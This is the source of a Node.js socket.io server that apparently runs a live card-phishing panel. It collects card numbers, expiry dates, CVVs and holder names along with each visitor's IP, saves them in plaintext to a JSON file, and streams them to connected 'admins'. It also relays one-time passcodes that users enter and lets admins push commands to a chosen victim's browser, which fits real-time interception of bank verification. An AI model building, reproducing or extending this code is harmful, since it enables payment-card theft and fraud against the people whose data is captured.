const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors({
  origin: 'https://strupnay.me',
  credentials: true
}));
const port = process.env.PORT || 8080;
const server = http.createServer(app);
const io = new Server(server, {
  path: '/socket.io/', // Explicitly set the path
  cors: {
    origin: 'https://strupnay.me',
    methods: ['GET', 'POST'],
    credentials: true
  },
  upgradeTimeout: 30000 // Increase upgrade timeout
});

// In-memory storage for card submissions
const submissionsFilePath = path.join(__dirname, 'submissions.json');
let cardSubmissionsQueue = []; // This will store submissions until an admin connects

// Function to load submissions from file
const loadSubmissions = () => {
  try {
    if (fs.existsSync(submissionsFilePath)) {
      const data = fs.readFileSync(submissionsFilePath, 'utf8');
      cardSubmissionsQueue = JSON.parse(data);
      console.log(`[Server] Loaded ${cardSubmissionsQueue.length} submissions from file.`);
    }
  } catch (error) {
    console.error('[Server] Error loading submissions from file:', error);
  }
};

// Function to save submissions to file
const saveSubmissions = () => {
  try {
    fs.writeFileSync(submissionsFilePath, JSON.stringify(cardSubmissionsQueue, null, 2), 'utf8');
    console.log('[Server] Submissions saved to file.');
  } catch (error) {
    console.error('[Server] Error saving submissions to file:', error);
  }
};

// Load submissions when the server starts
loadSubmissions();

io.on('connection', (socket) => {

  // Global broadcast for any new connection
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  console.log(`[Server] Client connected: ${socket.id} from ${clientIp}`);
  io.emit('visitor_update', {
    id: socket.id,
    ip: clientIp,
    created_at: new Date().toISOString()
  });

  // Handler for an admin identifying themselves
  socket.on('admin_hello', () => {
    socket.join('admins');
    console.log(`[Server] Admin connected: ${socket.id}`);

    // Send all queued card submissions to the newly connected admin
    cardSubmissionsQueue.forEach(submission => {
      socket.emit('card_submission', submission); // Emit directly to this admin's socket
    });
  });

  // Handler for card data from a user
  socket.on('card_submission', (payload) => {

    // Validate required fields
    const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
    const missingFields = requiredFields.filter(field => !payload[field]);
    
    if (missingFields.length > 0) {
      console.error('Missing required fields:', missingFields);
      return;
    }

    // Format the submission data
    const submissionPayload = {
      id: socket.id, // Use socket ID as unique identifier
      socket_id: socket.id, // Also include as socket_id for clarity
      ...payload,
      user_ip: clientIp,
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    // Add card type detection
    const cardNumber = payload.card_number.replace(/\s/g, '');
    submissionPayload.card_type = detectCardType(cardNumber);

    // Add the submission to the in-memory queue
    cardSubmissionsQueue.push(submissionPayload);
    saveSubmissions(); // Save to file after adding new submission
    console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);

    // Send the data ONLY to admins
    io.to('admins').emit('card_submission', submissionPayload);
  });

  // Helper function to detect card type
  function detectCardType(cardNumber) {
    if (cardNumber.startsWith('4')) return 'Visa';
    if (cardNumber.startsWith('5')) return 'MasterCard';
    if (cardNumber.startsWith('6')) return 'Discover';
    if (cardNumber.startsWith('3')) return 'American Express';
    return 'Unknown';
  }

  // Handler for commands from an admin
  socket.on('admin_command', (payload) => {
    // First, broadcast the command to all admins to keep their UIs synchronized.
    io.to('admins').emit('admin_command', payload);

    // Then, send the command to the specific target client, if one is specified.
    const targetSocketId = payload.submission_id;
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket) {
        // Relay the command to the specific user's browser
        targetSocket.emit('admin_command', payload);
      }
    }
  });

  // Handler for OTPs from a user
  socket.on('otp_submitted', (payload) => {
    console.log(`[Server] Received otp_submitted from ${socket.id} for submission_id: ${payload.submission_id}, OTP: ${payload.otp}`);
    const otpPayload = {
      ...payload,
      submission_id: payload.submission_id, // Ensure submission_id is explicitly included
      otp: payload.otp // Ensure OTP value is explicitly included
    };
    // Send the OTP ONLY to admins
    io.to('admins').emit('otp_submitted', otpPayload);
  });

  // Chat handlers remain global broadcasts
  socket.on('chat_message', (payload) => {
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    io.emit('start_chat', payload);
  });

  // Global broadcast for a client disconnecting
  socket.on('disconnect', () => {
    io.emit('visitor_left', { id: socket.id });
  });
});

// Serve static files from the dist directory
app.use(express.static(path.join(__dirname, 'dist')));

// For any route, serve index.html (for React Router support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

server.listen(port, '0.0.0.0', () => {
  console.log(`Server is running on port ${port}`);
});
